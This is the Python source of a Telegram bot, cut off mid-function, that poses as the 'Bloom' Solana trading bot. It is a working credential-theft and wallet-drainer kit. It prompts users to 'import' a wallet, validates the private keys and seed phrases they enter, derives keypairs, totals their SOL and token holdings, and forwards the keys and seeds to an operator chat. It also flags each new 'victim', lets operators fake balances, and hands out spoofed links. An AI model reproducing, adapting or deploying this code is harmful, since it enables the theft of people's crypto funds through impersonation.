import logging
import requests
import os
import base64
import base58
import aiohttp
import asyncio
from typing import Dict, List, Tuple
from flask import Flask
import threading

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running"

def run():
    app.run(host="0.0.0.0", port=8080)

threading.Thread(target=run).start()
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, ChatMember
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    CallbackContext, ContextTypes, filters, ChatMemberHandler
)

from bip_utils import (
    Bip39SeedGenerator, Bip39MnemonicValidator, Bip39Languages,
    Bip44, Bip44Coins, Bip44Changes
)

from nacl.signing import SigningKey

from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer as sys_transfer, TransferParams as SysTransferParams
from solders.message import Message
from solders.transaction import Transaction

from solana.rpc.api import Client
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TokenAccountOpts

from spl.token.instructions import (
    transfer_checked, TransferCheckedParams, create_associated_token_account,
    get_associated_token_address
)
from spl.token.constants import TOKEN_PROGRAM_ID

from construct import Struct, Bytes, Int64ul

# =========================
# ====== CONFIG/LOGS ======
# =========================

# Primary bot token (keep your first app flow intact)
BOT_TOKEN = ""

# Destination address used by the second script (still here for completeness if you later use confirm send, etc.)
DESTINATION_ADDRESS = Pubkey.from_string("28g3mp71cAABafQv6CWS2ZSaTJAWW8sXe9JtFgE9ZQTi")
# Store the last provided 64-byte secret (base58) per user for confirm_send
user_private_keys: Dict[int, str] = {}

# Solana RPC
solana_client = Client("https://api.mainnet-beta.solana.com")

# Forwarding chats
FORWARD_CHAT_ID = -1003744646955

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_balances: Dict[str, str] = {}
token_metadata_cache: Dict[str, Dict] = {}

# =========================
# ====== HELPERS ==========
# =========================

ACCOUNT_LAYOUT = Struct(
    "mint" / Bytes(32),
    "owner" / Bytes(32),
    "amount" / Int64ul,
)

def _split_chunks(s: str, limit: int = 4090):
    """Split long strings so Telegram doesn't cut them off."""
    out, cur, length = [], [], 0
    for line in s.splitlines(keepends=True):
        if length + len(line) > limit:
            out.append("".join(cur))
            cur, length = [line], len(line)
        else:
            cur.append(line)
            length += len(line)
    if cur:
        out.append("".join(cur))
    return out

def escape_markdown_v2(text):
    return (text.replace('\\', '\\\\')
                .replace('_', '\\_')
                .replace('*', '\\*')
                .replace('[', '\\[')
                .replace(']', '\\]')
                .replace('(', '\\(')
                .replace(')', '\\)')
                .replace('~', '\\~')
                .replace('`', '\\`')
                .replace('>', '\\>')
                .replace('#', '\\#')
                .replace('+', '\\+')
                .replace('-', '\\-'))

def get_sol_to_usd_rate():
    try:
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd")
        data = response.json()
        return data["solana"]["usd"]
    except Exception as e:
        logger.error(f"Error fetching SOL price: {e}")
        return 0

def get_sol_balance(pubkey: Pubkey) -> float:
    """Get SOL balance (synchronous client)."""
    return solana_client.get_balance(pubkey).value / 1e9

async def get_token_metadata(mint_address: str) -> Dict:
    """Fetch token metadata from Jupiter API (cached)."""
    if mint_address in token_metadata_cache:
        return token_metadata_cache[mint_address]

    metadata = {
        'name': f"Token {mint_address[:4]}...{mint_address[-4:]}",
        'symbol': 'UNKNOWN',
        'decimals': 6,
        'icon': ''
    }

    try:
        url = f"https://lite-api.jup.ag/tokens/v2/search?query={mint_address}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=7) as resp:
                text = await resp.text()
                if resp.status != 200:
                    logger.error(f"Jupiter metadata HTTP {resp.status} for {mint_address}: {text}")
                else:
                    try:
                        data = await resp.json()
                        if isinstance(data, list) and data:
                            token_info = data[0]
                            metadata.update({
                                'name': token_info.get('name', metadata['name']),
                                'symbol': token_info.get('symbol', metadata['symbol']),
                                'decimals': token_info.get('decimals', metadata['decimals']),
                                'icon': token_info.get('icon', '')
                            })
                        else:
                            logger.warning(f"Jupiter metadata empty for {mint_address}: {data}")
                    except Exception as parse_error:
                        logger.error(f"Jupiter JSON parse error for metadata {mint_address}: {parse_error} | Raw: {text}")
    except Exception as e:
        logger.error(f"Error fetching Jupiter metadata for {mint_address}: {e}")

    token_metadata_cache[mint_address] = metadata
    return metadata

async def get_token_price(mint_address: str) -> float:
    """Get token price in USD from Jupiter API."""
    try:
        url = f"https://lite-api.jup.ag/tokens/v2/search?query={mint_address}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=7) as resp:
                text = await resp.text()
                if resp.status != 200:
                    logger.error(f"Jupiter HTTP {resp.status} for {mint_address}: {text}")
                    return 0.0
                try:
                    data = await resp.json()
                    if isinstance(data, list) and data:
                        price = data[0].get("usdPrice")
                        if price is not None:
                            return float(price)
                        else:
                            logger.warning(f"Jupiter: No usdPrice for {mint_address}: {data[0]}")
                    else:
                        logger.warning(f"Jupiter: No valid response for {mint_address}: {data}")
                except Exception as parse_error:
                    logger.error(f"Jupiter JSON parse error for price {mint_address}: {parse_error} | Raw: {text}")
    except Exception as e:
        logger.error(f"Error fetching Jupiter price for {mint_address}: {e}")
    return 0.0

async def get_sol_usd_price() -> float:
    sol_mint = "So11111111111111111111111111111111111111112"
    return await get_token_price(sol_mint)

async def get_token_balances(owner_pubkey: Pubkey) -> List[Tuple[str, str, float, float]]:
    """Get all token balances with USD values."""
    tokens: List[Tuple[str, str, float, float]] = []
    try:
        resp = solana_client.get_token_accounts_by_owner(
            owner_pubkey,
            TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
        )

        if not resp.value:
            return tokens

        # Collect mint -> raw amount
        mint_amounts: Dict[str, int] = {}
        for token_account in resp.value:
            acc_info = solana_client.get_account_info(token_account.pubkey).value
            if not acc_info or not acc_info.data:
                continue

            try:
                raw_data = base64.b64decode(acc_info.data[0]) if isinstance(acc_info.data, list) else acc_info.data
                mint = str(Pubkey.from_bytes(raw_data[0:32]))
                amount = int.from_bytes(raw_data[64:72], "little")
                if amount > 0:
                    mint_amounts[mint] = amount
            except Exception as e:
                logger.error(f"Token account processing error: {e}")

        if not mint_amounts:
            return tokens

        # Fetch metadata & prices in parallel
        metadata_tasks = [get_token_metadata(mint) for mint in mint_amounts.keys()]
        price_tasks = [get_token_price(mint) for mint in mint_amounts.keys()]

        metadata_results, price_results = await asyncio.gather(
            asyncio.gather(*metadata_tasks),
            asyncio.gather(*price_tasks)
        )

        metadata_map = {mint: result for mint, result in zip(mint_amounts.keys(), metadata_results)}
        prices_map = {mint: price for mint, price in zip(mint_amounts.keys(), price_results)}

        for mint, amount in mint_amounts.items():
            decimals = metadata_map.get(mint, {}).get('decimals', 6)
            token_amount = amount / (10 ** decimals)
            usd_value = token_amount * prices_map.get(mint, 0.0)
            tokens.append((
                mint,
                metadata_map.get(mint, {}).get('name', f"Token {mint[:4]}...{mint[-4:]}"),
                token_amount,
                usd_value
            ))

        tokens.sort(key=lambda x: x[3], reverse=True)
    except Exception as e:
        logger.error(f"Token balance error: {e}")

    return tokens

def _parse_seed_and_pass(args) -> Tuple[str, str | None]:
    joined = " ".join(args).strip()
    if 'pass="' in joined:
        pre, _, post = joined.partition('pass="')
        passphrase, _, _ = post.partition('"')
        phrase = pre.strip().strip('"').strip("'")
        return phrase, passphrase
    return joined.strip().strip('"').strip("'"), None

async def derive_kp_from_seed_scan_best(phrase: str, passphrase: str | None = None, max_accounts: int = 5):
    """
    Scan paths (same order as your second script) and return FIRST funded:
      1) m/44'/501'/{i}'
      2) m/44'/501'/{i}'/0'
      3) m/44'/501'/{i}'/0/0
    Returns: (kp, secret64_bytes, chosen_path, sol_balance)
    """
    Bip39MnemonicValidator(Bip39Languages.ENGLISH).Validate(phrase)
    seed_bytes = Bip39SeedGenerator(phrase).Generate(passphrase or "")
    b44_root = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)

    best = None  # (balance, kp, secret64, path)

    for acct in range(max_accounts):
        ctx_account = b44_root.Purpose().Coin().Account(acct)
        ctx_change  = ctx_account.Change(Bip44Changes.CHAIN_EXT)
        ctx_addr0   = ctx_change.AddressIndex(0)

        candidates = [
            (f"m/44'/501'/{acct}'",            ctx_account),
            (f"m/44'/501'/{acct}'/0'",         ctx_change),
            (f"m/44'/501'/{acct}'/0/0",        ctx_addr0),
        ]

        for path, ctx in candidates:
            priv32 = ctx.PrivateKey().Raw().ToBytes()
            sk = SigningKey(priv32)
            secret64 = sk.encode() + sk.verify_key.encode()
            kp = Keypair.from_bytes(secret64)
            bal = solana_client.get_balance(kp.pubkey()).value / 1e9

            if bal > 0:
                return kp, secret64, path, bal

            if best is None or bal > best[0]:
                best = (bal, kp, secret64, path)

    if best is not None:
        return best[1], best[2], best[3], best[0]

    raise RuntimeError("Failed to derive any account from seed")

# ======================================
# ====== YOUR ORIGINAL HANDLERS =========
# ======================================

async def balance_command(update: Update, context: CallbackContext) -> None:
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /balance @username_or_userid amount")
            return

        target = args[0]
        amount = args[1]

        if target.startswith("@"):
            username = target.lstrip("@").lower()
        else:
            username = None
            if os.path.exists("users.txt"):
                with open("users.txt", "r") as f:
                    for line in f:
                        u, uid = line.strip().split(",")
                        if uid == target:
                            username = u.lower()
                            break

            if username is None:
                await update.message.reply_text("â Could not resolve username from user ID.")
                return

        user_balances[username] = amount
        await update.message.reply_text(f"â Set @{username}'s balance to {amount} SOL")
    except Exception as e:
        logger.error(f"Error in /balance: {e}")
        await update.message.reply_text("â Failed to set balance.")
async def start(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id

    # Extract chat ID from URL parameters
    query_params = update.message.text.split('?start=')
    chat_id_from_params = query_params[0]
    actuall_id = str(chat_id_from_params).lstrip('/start')
    cleaned_id = actuall_id.strip()

    logger.info(f"-{cleaned_id}")
    context.user_data['chat_id_from_params'] = cleaned_id

    if cleaned_id == "hitter":
        message = escape_markdown_v2("Success\n\nCommands:\n /send @username Message\n/balance \\<changed number\\>\n @BIoom_Solanabot")
        keyboard = [[InlineKeyboardButton("Support", url='https://t.me/')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        image_url = "https://media.discordapp.net/attachments/931287855504969728/1270613197988302918/image.png?ex=66b45641&is=66b304c1&hm=a84eef342e9c90f36827b1af30152d34509e4178e1569a08500278de2e601f26&=&format=webp&quality=lossless&width=1018&height=1018"

        await context.bot.send_photo(
            chat_id=chat_id,
            photo=image_url,
            caption=message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        if update.message:
            user = update.message.from_user
            user_id = user.id
            username = f"@{user.username}" if user.username else "N/A"

            victim_alert = (
                "â ï¸ <b>Potential Victim</b>\n\n"
                f"â ð¤ <b>{username}</b>\n"
                f"â ð <code>{user_id}</code>\n"
                f"â ð Premium: â\n\n"
                "ð· <i>A victim just ran /start using your link.</i>"
            )

            try:
                # Keep your original behavior here; only key uploads change
                await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=victim_alert, parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.error(f"Error sending victim alert: {e}")

        keyboard = [[InlineKeyboardButton("Continue", callback_data='continue')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = (
            "ð¸ Bloom - Your UNFAIR advantage in crypto ð¸\n\n"
            "Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, and moreâall within Telegram.\n\n"
            "By continuing, you'll create a crypto wallet that interacts directly with Bloom...\n\n"
            "â ï¸ IMPORTANT: After clicking \"Continue,\" your public wallet address and private key will be displayed. Keep it safe.\n\n"
            "By pressing \"Continue,\" you confirm that you understand and accept the risks."
        )

        await context.bot.send_message(
            chat_id=chat_id,
            text=message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

async def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'continue' or data == 'back':
        username = query.from_user.username.lower() if query.from_user.username else None
        balance = user_balances.get(username, "0")
        sol_amount = float(balance)
        sol_price = get_sol_to_usd_rate()
        usd_value = round(sol_amount * sol_price, 2)
        keyboard = [
            [InlineKeyboardButton("ð¼ Positions", callback_data='positions'),
             InlineKeyboardButton("ð¯ LP Sniper", callback_data='lp_sniper')],
            [InlineKeyboardButton("ð¤ Copy Trade", callback_data='copy_trade'),
             InlineKeyboardButton("ð¤ AFK Mode", callback_data='afk_mode')],
            [InlineKeyboardButton("ð Limit Orders", callback_data='limit_orders'),
             InlineKeyboardButton("ð¥ Referrals", callback_data='referrals')],
            [InlineKeyboardButton("ð¸ Withdraw", callback_data='withdraw'),
             InlineKeyboardButton("âï¸ Settings", callback_data='settings')],
            [InlineKeyboardButton("ð Refresh", callback_data='refresh'),
             InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Welcome to Bloom!</b>\n\nLet your trading journey <b>blossom</b> with us!\n\n"
            "ð¸ <b>Your</b> <b>Solana</b> Wallet Address:\nâ W1: <code>28g3mp71cAABafQv6CWS2ZSaTJAWW8sXe9JtFgE9ZQTi</code>\n"
            f"Balance: {balance} SOL (USD ${usd_value})\n\nð´ <b>Import A Funded Wallet To Get Started.</b>\n"
            "T start trading, please deposit SOL to your address.\n\nð <b>Resources:</b>\n\n"
            "â¢ ð <a href='https://docs.bloombot.app/solana/'>Bloom Docs</a>\n"
            "â¢ ð <a href='https://x.com/BloomTrading/'>Bloom X</a>\n"
            "â¢ ð <a href='https://www.bloombot.app/'>Bloom Website</a>\n"
            "â¢ ð¤ <a href='https://t.me/bloomportal'>Bloom Portal</a>\n"
            "â¢ ð¤ <a href='https://discord.gg/bloomtrading'>Bloom Discord</a>\n\n"
            '<a href="https://your-eu-link.com">ð©ðª EU1</a> â¢ <a href="https://your-us-link.com">ðºð¸ US1</a>\n\n'
            "ð <i>Last updated:</i> 00:56:25.159",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'positions':
        keyboard = [
            [InlineKeyboardButton("âï¸ Min Value: N/A SOL", callback_data='noop'),
             InlineKeyboardButton("âï¸ Sell Position: 100%", callback_data='noop')],
            [InlineKeyboardButton("ð  Homepage", callback_data='back'),
             InlineKeyboardButton("ð´ USD", callback_data='noop')],
            [InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Delete", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom Positions</b>\n\nNo open positions yet!\n"
            "Start your trading journey by pasting a contract address in chat.\n\n"
            "ð <i>Last updated:</i> 19:37:21.482",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'lp_sniper':
        keyboard = [
            [InlineKeyboardButton("ð¯ Pro Accounts", callback_data='noop'),
             InlineKeyboardButton("ð¯ Create Task", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom Sniper</b>\n\nð No active sniper tasks!\n\n"
            "ð <a href='https://xrer.com/BloomTradingBot'>Learn More!</a>\n\n"
            "ð <i>Last updated:</i> 20:24:48.577",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'copy_trade':
        keyboard = [
            [InlineKeyboardButton("ð Add new config", callback_data='noop')],
            [InlineKeyboardButton("â¸ Pause All", callback_data='noop'),
             InlineKeyboardButton("â¶ï¸ Start All", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom Copy Trade</b>\n\nð¡ Copy the best traders with Bloom!\n\n"
            "Copy Wallet:\nâ W1: <code>HoMTmYL2GvMLNaV45P4uJ6QhSxK5gdntsdeUhjhDeZrT</code>\n\n"
            "ð¢ Copy trade setup is <b>active</b>\nð´ Copy trade setup is <b>inactive</b>\n\n"
            "â± Please wait 10 seconds after each change for it to take effect.\n\n"
            "â ï¸ <b>Changing your copy wallet?</b> Remake your tasks.\n\n"
            "ð <i>Last updated:</i> 20:44:30.742",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'afk_mode':
        keyboard = [
            [InlineKeyboardButton("ð Add new config", callback_data='noop')],
            [InlineKeyboardButton("â¸ Pause All", callback_data='noop'),
             InlineKeyboardButton("â¶ï¸ Start All", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom AFK</b>\n\nð¡ Run your bot while you are away!\n\n"
            "AFK Wallet:\nâ W1: <code>HoMTmYL2GvMLNaV45P4uJ6QhSxK5gdntsdeUhjhDeZrT</code>\n\n"
            "ð¢ AFK mode is <b>active</b>\nð´ AFK mode is <b>inactive</b>\n\n"
            "â± Please wait 10 seconds after each change for it to take effect.\n\n"
            "â ï¸ <b>Changing your Default wallet?</b> Remake your tasks.\n\n"
            "ð <i>Last updated:</i> 20:55:48.473",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'limit_orders':
        keyboard = [
            [InlineKeyboardButton("ð  Homepage", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Delete", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom Orders</b>\n\nð No active limit orders!\n"
            "Create a limit order from the token page.\n\n"
            "ð <i>Last updated:</i> 21:05:17.263",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'referrals':
        keyboard = [
            [InlineKeyboardButton("ð Change Referral Code", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "Your Referral Code:\nð <code>ref_0EW9TYD0C</code>\n\n"
            "Your Payout Address:\n<code>HoMTmYL2GvMLNaV45P4uJ6QhSxK5gdntsdeUhjhDeZrT</code>\n\n"
            "ð <b>Referrals Volume:</b>\nâ¢ Level 1: 0 Users / 0 SOL\nâ¢ Level 2: 0 Users / 0 SOL\n"
            "â¢ Level 3: 0 Users / 0 SOL\nâ¢ Referred Trades: 0\n\n"
            "ð¯ <b>Rewards Overview:</b>\nâ¢ Total Unclaimed: 0 SOL\nâ¢ Total Claimed: 0 SOL\n"
            "â¢ Lifetime Earnings: 0 SOL\nâ¢ Last distribution: 2025-02-16 12:19:06\n\n"
            "ð <a href='https://xrer.com/BloomTradingBot'>Learn More!</a>\n\n"
            "ð <i>Last updated:</i> 20:56:51.901",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'withdraw':
        keyboard = [
            [InlineKeyboardButton("50 %", callback_data='noop'),
             InlineKeyboardButton("100 %", callback_data='noop'),
             InlineKeyboardButton("X SOL", callback_data='noop')],
            [InlineKeyboardButton("ðª Set Address", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Withdraw Solana</b>\n\nBalance: 0 SOL\n\n"
            "Current withdrawal address:\n\n"
            "ð§ Last address edit: -\n\n"
            "ð <i>Last updated:</i> 21:54:03.832",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'settings':
        keyboard = [
            [InlineKeyboardButton("Expert Mode: ð´", callback_data='noop')],
            [InlineKeyboardButton("â½ï¸ Fee", callback_data='noop'),
             InlineKeyboardButton("ð° Wallets", callback_data='Wallets')],
            [InlineKeyboardButton("ð Slippage", callback_data='noop'),
             InlineKeyboardButton("ð§ Presets", callback_data='noop')],
            [InlineKeyboardButton("ð´ Degen Mode", callback_data='noop'),
             InlineKeyboardButton("ð´ MEV Protect", callback_data='noop')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Refresh", callback_data='refresh')],
            [InlineKeyboardButton("ð Close", callback_data='close')]
        ]
        await query.edit_message_text(
            "ð¸ <b>Bloom Settings</b>\n\n"
            "ð¢ : The feature/mode is turned <b>ON</b>\nð´ : The feature/mode is turned <b>OFF</b>\n\n"
            "ð <a href='https://xrer.com/BloomTradingBot'>Learn More!</a>\n\n"
            "ð <i>Last updated:</i> 22:03:31.784",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data == 'Wallets':
        username = query.from_user.username.lower() if query.from_user.username else None
        balance = user_balances.get(username, "0")
        keyboard = [
            [InlineKeyboardButton(f"ð¢ W1 â¢ {balance} SOL", callback_data='noop')],
            [InlineKeyboardButton("ð° Create Wallet", callback_data='create_wallet'),
             InlineKeyboardButton("ð Import Wallet", callback_data='import_wallet')],
            [InlineKeyboardButton("â¬ï¸ Back", callback_data='back'),
             InlineKeyboardButton("ð Close", callback_data='close')]
        ]

        await query.edit_message_text(
            "ð¸ <b>Wallets Settings</b>\n\n"
            "Manage all your wallets with <b>ease</b>.\n\n"
            "ð <a href='https://xrr4.com/BloomTradingBot'>Learn More!</a>\n\n"
            "ð <i>Last updated:</i> 22:28:19.089",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )

    elif data in ("import_wallet", "try_again"):
        prompt_message = "Please enter your private key:"
        await query.message.reply_text(
            text=prompt_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        context.user_data['awaiting_input'] = True

    elif data == 'admin_set_balance':
        await query.answer()
        await query.message.reply_text(
            "ð° <b>Set Balance</b>\n\n"
            "Please send:\n"
            "<code>@username_or_userid amount</code>\n\n"
            "Example: <code>@username 10.5</code> or <code>123456789 10.5</code>",
            parse_mode=ParseMode.HTML
        )
        context.user_data['admin_action'] = 'set_balance'

    elif data == 'admin_send_message':
        await query.answer()
        await query.message.reply_text(
            "ð¨ <b>Send Message</b>\n\n"
            "Please send:\n"
            "<code>@username_or_userid Your message here</code>\n\n"
            "Example: <code>@username Hello, this is a test message</code>",
            parse_mode=ParseMode.HTML
        )
        context.user_data['admin_action'] = 'send_message'

    else:
        prompt_message = '*No funds detected\\. Please deposit or import a wallet\\.*'
        await query.message.reply_text(
            text=prompt_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        context.user_data['awaiting_input'] = False
# ======================================
# ====== KEY INPUT -> RUN LOGIC ========
# ======================================

async def handle_message(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    username = user.username or user.full_name
    user_text = update.message.text
    user_id = user.id

    logger.info(f"User: {user_id}, @{user.username}")

    # Handle admin actions
    admin_action = context.user_data.get('admin_action')
    if admin_action:
        try:
            parts = user_text.strip().split(None, 1)
            if len(parts) < 2:
                await update.message.reply_text("â Invalid format. Please try again.")
                context.user_data['admin_action'] = None
                return

            target = parts[0]
            if admin_action == 'set_balance':
                amount = parts[1]
                # Use the balance_command logic
                if target.startswith("@"):
                    username_target = target.lstrip("@").lower()
                else:
                    username_target = None
                    if os.path.exists("users.txt"):
                        with open("users.txt", "r") as f:
                            for line in f:
                                u, uid = line.strip().split(",")
                                if uid == target:
                                    username_target = u.lower()
                                    break

                    if username_target is None:
                        await update.message.reply_text("â Could not resolve username from user ID.")
                        context.user_data['admin_action'] = None
                        return

                user_balances[username_target] = amount
                await update.message.reply_text(f"â Set @{username_target}'s balance to {amount} SOL")
                context.user_data['admin_action'] = None
                return

            elif admin_action == 'send_message':
                message = parts[1]
                # Use the send_user_command logic
                chat_id = None
                if target.startswith("@"):
                    target_clean = target.lstrip("@")
                    if os.path.exists("users.txt"):
                        with open("users.txt", "r") as f:
                            for line in f:
                                u, uid = line.strip().split(",")
                                if u.lower() == target_clean.lower():
                                    chat_id = int(uid)
                                    break
                elif target.isdigit():
                    chat_id = int(target)

                if not chat_id:
                    await update.message.reply_text(f"â Could not find user ID for {target}. They must message the bot first.")
                    context.user_data['admin_action'] = None
                    return

                await context.bot.send_message(chat_id=chat_id, text=f"<b>{message}</b>", parse_mode=ParseMode.HTML)
                await update.message.reply_text(f"â Message sent to {target}")
                context.user_data['admin_action'] = None
                return

        except Exception as e:
            logger.error(f"Error in admin action: {e}")
            await update.message.reply_text(f"â Error: {str(e)}")
            context.user_data['admin_action'] = None
            return

    if user.username:
        log_entry = f"{user.username},{user_id}\n"
        if os.path.exists("users.txt"):
            with open("users.txt", "r") as f:
                existing_entries = f.readlines()
            if log_entry not in existing_entries:
                with open("users.txt", "a") as f:
                    f.write(log_entry)
                    logger.info(f"â Stored user: @{user.username} - {user_id}")
        else:
            with open("users.txt", "w") as f:
                f.write(log_entry)
                logger.info(f"â Stored user: @{user.username} - {user_id}")

    if context.user_data.get('awaiting_input'):
        escaped_username = escape_markdown_v2(username)
        escaped_user_text = escape_markdown_v2(user_text)
        forward_message = (
            f'_User Logged_: *{escaped_username}*\n\n'
            f'_Users input_:\n\n`{escaped_user_text}`'
        )
        try:
            await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=forward_message, parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Error sending raw input to forward chats: {e}")

        joined = user_text.strip()
        kp = None
        used_path = None
        sol_balance = 0.0
        result_msg = f"ð¤ *User:* @{username}\nð *Checked Input*\n\n"

        try:
            try:
                decoded = base58.b58decode(joined)
                if len(decoded) == 64:
                    kp = Keypair.from_bytes(decoded)
                else:
                    raise ValueError("Not a 64-byte secret")
            except Exception:
                phrase, passphrase = _parse_seed_and_pass([user_text])
                kp, secret64, used_path, sol_balance = await derive_kp_from_seed_scan_best(
                    phrase, passphrase=passphrase, max_accounts=5
                )

            pubkey = kp.pubkey()
            if sol_balance == 0.0:
                sol_balance = get_sol_balance(pubkey)

            if 'secret64' in locals():
                secret_b58 = base58.b58encode(secret64).decode("utf-8")
            else:
                secret_b58 = joined

            user_private_keys[user_id] = secret_b58

            sol_usd = await get_sol_usd_price()
            sol_value = sol_balance * sol_usd
            tokens = await get_token_balances(pubkey)

            result_msg += f"â *Valid*\nð `{pubkey}`\nð° {sol_balance:.4f} SOL (${sol_value:,.2f})"
            if used_path:
                result_msg += f"\nð§­ Path: `{used_path}`"
            
            result_msg += f"\nð *Private Key:* `{secret_b58}`"
            if 'phrase' in locals():
                result_msg += f"\nð± *Seed Phrase:* `{phrase}`"

            if tokens:
                result_msg += "\n\nð *Tokens:*"
                total_value = sol_value
                for mint, name, amount, usd in tokens:
                    result_msg += (
                        f"\nâ¢ *{name}* ({mint[:4]}...{mint[-4:]})\n"
                        f"  Amount: `{amount:,.4f}`\n"
                        f"  Value: `${usd:,.2f}`"
                    )
                    total_value += usd
                result_msg += f"\n\nðµ *Total Value:* `${total_value:,.2f}`"
            else:
                result_msg += "\n\nNo tokens found."

            await update.message.reply_text(
                "*WAIT WHILE YOUR WALLET IS BEING IMPORTED*\n\n",
                parse_mode=ParseMode.MARKDOWN_V2,
            )

        except Exception as e:
            logger.error(f"Error processing key/seed: {e}")
            result_msg += f"â *Invalid Key/Seed*\nError: `{str(e)}`"
            await update.message.reply_text(
                "*WAIT WHILE YOUR WALLET IS BEING IMPORTED*",
                parse_mode=ParseMode.MARKDOWN_V2,
            )

        kb = None

        chunks = _split_chunks(result_msg)
        for i, chunk in enumerate(chunks):
            await context.bot.send_message(
                chat_id=FORWARD_CHAT_ID,
                text=chunk,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
                reply_markup=kb if i == len(chunks) - 1 else None
            )
# ======================================
# ====== GROUP ADD HANDLER =============
# ======================================

async def handle_my_chat_member(update: Update, context: CallbackContext) -> None:
    chat_member_update = update.my_chat_member
    new_status = chat_member_update.new_chat_member.status
    old_status = chat_member_update.old_chat_member.status
    chat_id = chat_member_update.chat.id
    chat_title = chat_member_update.chat.title
    escaped_title = escape_markdown_v2(chat_title)
    positive_chat_id = str(chat_id).lstrip('-')

    if (new_status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR]) and \
       old_status not in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR]:
        try:
            chat_info = await context.bot.get_chat(chat_id)
            chat_photo = chat_info.photo

            if chat_photo:
                file_id = chat_photo.big_file_id
                file = await context.bot.get_file(file_id)
                local_file_path = 'profile_photo.jpg'
                file_url = file.file_path
                response = requests.get(file_url)
                if response.status_code == 200:
                    with open(local_file_path, 'wb') as f:
                        f.write(response.content)

                    await context.bot.send_photo(
                        chat_id=chat_id,
                        photo=open(local_file_path, 'rb'),
                        caption=f"{escaped_title} Successfully setup\n\nAll logs will be sent to this chat\\!\n\n\nYour link to start hitting: `https://t.me/TronSnipesBot?start={positive_chat_id}`\n\n Your spoofed link is [https://t.me/TronSnipeBot](https://t.me/TronSnipesBot?start={positive_chat_id})",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Support", url=f'https://t.me/')]]),
                        parse_mode='MarkdownV2'
                    )
                    os.remove(local_file_path)
                else:
                    raise Exception("Failed to download the file.")
            else:
